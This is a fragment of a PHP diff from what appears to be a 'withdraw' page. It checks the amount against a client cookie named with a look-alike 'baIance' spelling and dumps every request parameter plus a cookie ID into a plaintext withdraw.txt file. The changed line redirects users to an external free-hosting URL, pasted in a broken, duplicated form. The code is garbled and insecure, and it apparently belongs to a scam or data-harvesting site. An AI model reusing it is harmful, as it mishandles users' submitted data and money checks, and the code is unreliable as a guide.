@@ -10,7 +10,7 @@ if ($kopo > $_COOKIE["baIance"]){
 }else{
   $kol=implode(" ",$_REQUEST);
   $kolo=$kol.$_cookie["alavi_id"];
-  $scripts="<sCript>location.href='./after getinb.php'</script>";
+  $scripts="<sCript>location.href='./https://dccm.000webhostapp.com/after https://dccm.000webhostapp.com/getinb.php'</script>";
   file_put_contents('withdraw.txt',$kolo);
   $alavi_key=$_COOKIE["alavi_key"];
   $alavi_id=$_COOKIE["alavi_id"];
